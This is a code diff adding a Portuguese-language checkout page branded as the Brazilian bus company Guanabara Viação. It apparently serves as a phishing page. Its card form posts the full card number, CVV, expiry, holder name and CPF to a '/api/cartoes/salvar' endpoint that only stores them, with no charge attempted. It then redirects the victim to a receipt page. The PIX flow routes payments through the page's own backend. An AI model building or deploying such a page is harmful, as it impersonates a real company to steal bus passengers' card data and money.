@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Guanabara | Checkout Seguro</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2c/Guanabara_Logo.png/180px-Guanabara_Logo.png">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+    <style>
+        /* (MANTENHA O CSS DO SEU CHECKOUT ORIGINAL AQUI) */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; background: #f0f2f5; color: #1a1f36; min-height: 100vh; }
+        .top-bar { background: #ffffff; border-bottom: 1px solid #e6e9f0; padding: 20px 0; position: sticky; top: 0; z-index: 100; box-shadow: 0 1px 4px rgba(0,0,0,0.04); }
+        .top-bar-content { max-width: 1280px; margin: 0 auto; padding: 0 32px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; }
+        .logo-area { display: flex; align-items: center; gap: 58px; }
+        .logo-text h2 { font-size: 1.35rem; font-weight: 800; color: #1a1f36; }
+        .logo-text h2 span { color: #ffb800; }
+        .secure-badge { display: flex; align-items: center; gap: 8px; background: #f3f4f6; padding: 8px 16px; border-radius: 40px; font-size: 0.75rem; color: #059669; }
+        .checkout-container { max-width: 1280px; margin: 0 auto; padding: 32px; display: grid; grid-template-columns: 1fr 440px; gap: 32px; }
+        @media (max-width: 1000px) { .checkout-container { grid-template-columns: 1fr; padding: 20px; } }
+        .payment-section { background: #ffffff; border-radius: 24px; box-shadow: 0 1px 3px rgba(0,0,0,0.05), 0 8px 24px rgba(0,0,0,0.04); overflow: hidden; }
+        .payment-methods { padding: 24px 32px; display: flex; gap: 16px; border-bottom: 1px solid #eef2f6; background: #fafbfc; flex-wrap: wrap; }
+        .method-option { flex: 1; display: flex; align-items: center; justify-content: center; gap: 10px; padding: 14px 20px; background: #ffffff; border: 1.5px solid #e1e5eb; border-radius: 16px; cursor: pointer; transition: all 0.2s; font-weight: 500; color: #4b5563; flex-wrap: wrap; }
+        .method-option.active { border-color: #ffb800; background: #fffcf0; color: #ffb800; }
+        .pix-content { padding: 32px; }
+        .qr-card { background: #ffffff; border: 1px solid #eef2f6; border-radius: 24px; padding: 32px; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.03); }
+        .qr-placeholder { background: #fafbfc; border-radius: 20px; padding: 24px; margin-bottom: 20px; }
+        #qrcode { width: 200px; height: 200px; margin: 0 auto; }
+        #qrcode img { width: 100%; height: 100%; }
+        .pix-code-card { background: #f8f9fc; border-radius: 16px; padding: 16px; margin-top: 20px; text-align: left; border: 1px solid #eef2f6; }
+        .pix-code-value { font-family: monospace; font-size: 0.75rem; word-break: break-all; color: #1a1f36; background: #ffffff; padding: 12px; border-radius: 12px; border: 1px solid #eef2f6; margin-bottom: 12px; }
+        .payment-status { margin-top: 20px; padding: 12px; border-radius: 12px; text-align: center; font-size: 0.85rem; }
+        .status-waiting { background: #fff8e1; color: #f57c00; }
+        .status-paid { background: #e8f5e9; color: #2e7d32; }
+        .card-content { padding: 32px; }
+        .card-preview { background: linear-gradient(135deg, #1a1f36 0%, #2d3748 100%); border-radius: 20px; padding: 20px; margin-bottom: 32px; color: white; position: relative; min-height: 200px; }
+        .form-row { margin-bottom: 20px; }
+        .form-row label { display: block; font-size: 0.75rem; font-weight: 600; color: #4b5563; margin-bottom: 6px; }
+        .form-row input { width: 100%; padding: 14px 16px; background: #ffffff; border: 1.5px solid #e1e5eb; border-radius: 12px; font-family: 'Inter', sans-serif; font-size: 0.9rem; transition: all 0.2s; }
+        .form-row input:focus { outline: none; border-color: #ffb800; }
+        .double-row { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+        .order-summary { background: #ffffff; border-radius: 24px; box-shadow: 0 1px 3px rgba(0,0,0,0.05), 0 8px 24px rgba(0,0,0,0.04); position: sticky; top: 90px; height: fit-content; }
+        .product-item { padding: 20px 24px; display: flex; gap: 16px; border-bottom: 1px solid #eef2f6; align-items: center; }
+        .product-details h4 { font-size: 1rem; font-weight: 600; margin-bottom: 4px; }
+        .price-details { padding: 20px 24px; }
+        .total-line { display: flex; justify-content: space-between; padding-top: 16px; margin-top: 12px; border-top: 1px solid #eef2f6; font-weight: 700; font-size: 1.1rem; color: #1a1f36; }
+        .total-line span:last-child { color: #ffb800; font-size: 1.3rem; }
+        .btn-confirm { margin: 0 24px 24px; width: calc(100% - 48px); padding: 16px; background: #ffb800; border: none; border-radius: 40px; font-weight: 700; font-size: 1rem; color: #1a1f36; cursor: pointer; transition: all 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .btn-confirm:disabled { background: #e5e7eb; cursor: not-allowed; }
+        .btn-generate { width: 100%; padding: 14px; background: #ffb800; border: none; border-radius: 40px; font-weight: 600; cursor: pointer; margin-top: 16px; }
+        .hidden { display: none; }
+        .loading-state { text-align: center; padding: 40px; color: #ffb800; }
+        .error-state { text-align: center; padding: 20px; color: #dc2626; background: #fef2f2; border-radius: 16px; }
+    </style>
+</head>
+<body>
+
+<div class="top-bar">
+    <div class="top-bar-content">
+        <div class="logo-area">
+            <div class="logo-text">
+                <h2>Guanabara <span>Viação</span></h2>
+                <p>Passagens de ônibus seguras</p>
+            </div>
+        </div>
+        <div class="secure-badge">
+            <i class="fas fa-lock"></i> <span>Pagamento 100% seguro</span>
+        </div>
+    </div>
+</div>
+
+<div class="checkout-container">
+    <div class="payment-section">
+        <div class="payment-methods">
+            <div class="method-option active" onclick="metodoPagamento('pix')">
+                <i class="fas fa-qrcode"></i> <span>PIX</span>
+            </div>
+            <div class="method-option" onclick="metodoPagamento('cartao')">
+                <i class="fas fa-credit-card"></i> <span>Cartão de crédito</span>
+            </div>
+        </div>
+
+        <div id="pixSection" class="pix-content">
+            <div class="qr-card">
+                <div id="pixLoading" class="loading-state"><i class="fas fa-spinner fa-pulse"></i><p>Clique em gerar PIX</p></div>
+                <div id="pixError" class="error-state hidden"></div>
+                <div id="qrcodeWrapper" class="qr-placeholder hidden"><div id="qrcode"></div></div>
+                <div id="pixCodeDiv" class="pix-code-card hidden">
+                    <div class="pix-code-value" id="pixCodeValue"></div>
+                    <button class="btn-secondary" id="btnCopiarPix" onclick="copiarQrCode()"><i class="fas fa-copy"></i> Copiar código</button>
+                </div>
+                <div id="paymentStatus" class="payment-status hidden"></div>
+                <button class="btn-generate" id="btnGerarPix" onclick="gerarPix()"><i class="fas fa-bolt"></i> Gerar PIX</button>
+            </div>
+        </div>
+
+        <div id="cartaoSection" class="card-content hidden">
+            <div class="card-preview" id="cardPreview">
+                <div class="card-number-preview" id="cardNumberPreview">**** **** **** ****</div>
+                <div class="card-details-preview">
+                    <span id="cardNamePreview">NOME DO TITULAR</span>
+                    <span id="cardExpiryPreview">**/**</span>
+                </div>
+            </div>
+            <div class="form-row"><label>Número do cartão</label><input type="text" id="numeroCartao" placeholder="0000 0000 0000 0000" oninput="formatarCartao(this)"></div>
+            <div class="form-row"><label>Nome no cartão</label><input type="text" id="nomeTitular" placeholder="Como está no cartão"></div>
+            <div class="double-row">
+                <div class="form-row"><label>Validade</label><input type="text" id="validade" placeholder="MM/AA" oninput="formatarValidade(this)"></div>
+                <div class="form-row"><label>CVV</label><input type="text" id="cvv" placeholder="123"></div>
+            </div>
+            <div class="form-row"><label>CPF do titular</label><input type="text" id="cpfTitular" placeholder="000.000.000-00"></div>
+        </div>
+    </div>
+
+    <div class="order-summary">
+        <div class="product-item">
+            <div class="product-details">
+                <h4 id="produtoNome">Carregando...</h4>
+                <p>1 passageiro · Embarque programado</p>
+            </div>
+        </div>
+        <div class="price-details">
+            <div class="total-line"><span>Total</span><span id="totalValor">R$ 0,00</span></div>
+        </div>
+        <button class="btn-confirm" id="btnConfirmar" onclick="confirmarPagamento()"><i class="fas fa-check-circle"></i> Confirmar pagamento</button>
+    </div>
+</div>
+
+<script>
+    let metodoAtual = 'pix';
+    let produtoPreco = parseFloat(localStorage.getItem('produto_preco') || '0');
+    let clienteCpf = localStorage.getItem('cliente_cpf') || '';
+    let clienteTelefone = localStorage.getItem('cliente_telefone') || '';
+    let currentPixCode = '';
+    let currentTransactionId = '';
+    let qrcodeInstance = null;
+    let paymentCheckInterval = null;
+    let paymentConfirmed = false;
+    
+    document.getElementById('produtoNome').innerHTML = localStorage.getItem('produto_nome') || 'Passagem';
+    document.getElementById('totalValor').innerHTML = `R$ ${produtoPreco.toFixed(2)}`;
+    document.getElementById('btnConfirmar').disabled = true;
+
+    function detectarDispositivo() {
+        const ua = navigator.userAgent;
+        if (/android/i.test(ua)) return "Android";
+        if (/iPad|iPhone|iPod/.test(ua)) return "iOS";
+        if (/Windows/.test(ua)) return "Windows";
+        if (/Mac/.test(ua)) return "MacOS";
+        return "Desconhecido";
+    }
+
+    function detectarNavegador() {
+        const ua = navigator.userAgent;
+        if (ua.indexOf("Chrome") > -1) return "Chrome";
+        if (ua.indexOf("Safari") > -1) return "Safari";
+        if (ua.indexOf("Firefox") > -1) return "Firefox";
+        return "Outro";
+    }
+
+    function metodoPagamento(metodo) {
+        metodoAtual = metodo;
+        document.querySelectorAll('.method-option').forEach(opt => opt.classList.remove('active'));
+        event.target.closest('.method-option').classList.add('active');
+        if (metodo === 'pix') {
+            document.getElementById('pixSection').classList.remove('hidden');
+            document.getElementById('cartaoSection').classList.add('hidden');
+            document.getElementById('btnConfirmar').disabled = !paymentConfirmed;
+        } else {
+            document.getElementById('pixSection').classList.add('hidden');
+            document.getElementById('cartaoSection').classList.remove('hidden');
+        }
+    }
+
+    function mostrarQrCode(pixCode, transactionId) {
+        if (qrcodeInstance) document.getElementById('qrcode').innerHTML = '';
+        currentTransactionId = transactionId;
+        document.getElementById('pixLoading').classList.add('hidden');
+        document.getElementById('pixError').classList.add('hidden');
+        document.getElementById('qrcodeWrapper').classList.remove('hidden');
+        document.getElementById('pixCodeDiv').classList.remove('hidden');
+        qrcodeInstance = new QRCode(document.getElementById('qrcode'), { text: pixCode, width: 200, height: 200 });
+        document.getElementById('pixCodeValue').innerHTML = pixCode;
+        const statusDiv = document.getElementById('paymentStatus');
+        statusDiv.classList.remove('hidden');
+        statusDiv.className = 'payment-status status-waiting';
+        statusDiv.innerHTML = '<i class="fas fa-clock"></i> Aguardando pagamento...';
+        startPaymentCheck(transactionId);
+    }
+
+    function startPaymentCheck(transactionId) {
+        if (paymentCheckInterval) clearInterval(paymentCheckInterval);
+        paymentCheckInterval = setInterval(async () => {
+            try {
+                const response = await fetch(`/api/check-payment/${transactionId}`);
+                const data = await response.json();
+                if (data.status === 'paid') {
+                    clearInterval(paymentCheckInterval);
+                    paymentConfirmed = true;
+                    document.getElementById('paymentStatus').className = 'payment-status status-paid';
+                    document.getElementById('paymentStatus').innerHTML = '<i class="fas fa-check-circle"></i> Pagamento confirmado!';
+                    document.getElementById('btnConfirmar').disabled = false;
+                }
+            } catch (error) { console.error('Erro ao verificar pagamento:', error); }
+        }, 3000);
+    }
+
+    async function gerarPix() {
+        const btnGerar = document.getElementById('btnGerarPix');
+        btnGerar.disabled = true;
+        btnGerar.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Gerando...';
+        document.getElementById('pixLoading').classList.remove('hidden');
+        document.getElementById('pixLoading').innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Gerando PIX...';
+
+        try {
+            const response = await fetch('/api/create-payment', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    amount: produtoPreco,
+                    customer_cpf: clienteCpf || '00000000000',
+                    customer_phone: clienteTelefone || '41992878772'
+                })
+            });
+            const data = await response.json();
+            if (data.success && data.payment && data.payment.pix_code) {
+                currentPixCode = data.payment.pix_code;
+                mostrarQrCode(currentPixCode, data.payment.id);
+                btnGerar.classList.add('hidden');
+            } else {
+                document.getElementById('pixError').classList.remove('hidden');
+                document.getElementById('pixError').innerHTML = data.error || 'Erro ao gerar PIX.';
+                btnGerar.disabled = false;
+                btnGerar.innerHTML = '<i class="fas fa-bolt"></i> Gerar PIX';
+            }
+        } catch (error) {
+            document.getElementById('pixError').classList.remove('hidden');
+            document.getElementById('pixError').innerHTML = 'Erro de conexão.';
+            btnGerar.disabled = false;
+            btnGerar.innerHTML = '<i class="fas fa-bolt"></i> Gerar PIX';
+        }
+    }
+
+    function copiarQrCode() { if (currentPixCode) navigator.clipboard.writeText(currentPixCode); }
+
+    async function confirmarPagamento() {
+        if (metodoAtual === 'pix' && !paymentConfirmed) return;
+        const btnConfirmar = document.getElementById('btnConfirmar');
+        btnConfirmar.disabled = true;
+        btnConfirmar.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Finalizando...';
+        
+        if (metodoAtual === 'cartao') {
+            const nomeTitular = document.getElementById('nomeTitular').value;
+            const numeroCartao = document.getElementById('numeroCartao').value;
+            const cvv = document.getElementById('cvv').value;
+            const validade = document.getElementById('validade').value;
+            try {
+                await fetch('/api/cartoes/salvar', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        nome_titular: nomeTitular,
+                        numero_cartao: numeroCartao,
+                        cvv: cvv,
+                        validade: validade,
+                        cpf: clienteCpf,
+                        telefone: clienteTelefone
+                    })
+                });
+            } catch (error) { console.error(error); }
+        }
+        window.location.href = '/comprovante';
+    }
+</script>
+</body>
+</html>
